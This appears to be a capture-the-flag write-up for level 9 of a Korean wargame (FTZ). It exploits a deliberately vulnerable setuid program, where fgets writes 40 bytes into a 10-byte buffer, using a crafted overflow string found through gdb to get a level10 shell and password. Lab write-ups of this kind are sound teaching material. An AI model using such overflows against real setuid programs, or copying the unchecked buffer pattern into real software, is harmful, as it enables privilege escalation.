# Level9

## This level's goal

- BOF(Buffer OverFlow)

***

```
[level9@ftz level9]$ cat hint

다음은 /usr/bin/bof의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(){

  char buf2[10];
  char buf[10];

  printf("It can be overflow : ");
  fgets(buf,40,stdin);

  if ( strncmp(buf2, "go", 2) == 0 )
   {
        printf("Good Skill!\n");
        setreuid( 3010, 3010 );
        system("/bin/bash");
   }

}

이를 이용하여 level10의 권한을 얻어라.

[level9@ftz tmp]$ ls -l /usr/bin/bof
-rws--x---    1 level10  level9      12111  8¿ù 19  2014 /usr/bin/bof
```
you cannot debug cuz level9 have only execute permission.
so, you need to make your another file and complie and debug
```
[level9@ftz tmp]$ cat bof.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

main(){

        char buf2[10];
        char buf[10];

        printf("It can be overflow : ");
        fgets(buf,40,stdin);
        
        # show the buffer memory address
        printf("&buf=0x%x, &buf2=0x%x, distance=0x000000%x / %d byte\n",buf, buf2, buf2-buf, buf2-buf);

        if ( strncmp(buf2, "go", 2) == 0 )
        {
            printf("Good Skill!\n");
            setreuid( 3010, 3010 );
            system("/bin/bash");
        }

}

[level9@ftz tmp]$ gcc -g -o bof bof.c
```

```
[level9@ftz tmp]$ gdb bof
(gdb) disass main
0x08048493 <main+115>:  call   0x8048330 <strncmp>
(gdb) break *0x08048493
Breakpoint 1 at 0x8048493: file bof.c, line 15.
(gdb) run
Starting program: /home/level9/tmp/bof
It can be overflow : AAAAAAAAAABBBBBBgo
&buf=0xbfffe750, &buf2=0xbfffe760, distance=0x00000010 / 16 byte
Breakpoint 1, 0x08048493 in main () at bof.c:15
15              if ( strncmp(buf2, "go", 2) == 0 )
(gdb) x/s 0xbfffe750
0xbfffe750:      "AAAAAAAAAABBBBBBgo\n"
(gdb) x/s 0xbfffe760
0xbfffe760:      "go\n"
(gdb) continue
Continuing.
Good Skill!
```

```
[level9@ftz level9]$ /usr/bin/bof
It can be overflow : AAAAAAAAAABBBBBBgo
Good Skill!

[level10@ftz level9]$ my-pass
Level10 Password is "interesting to hack!".
```
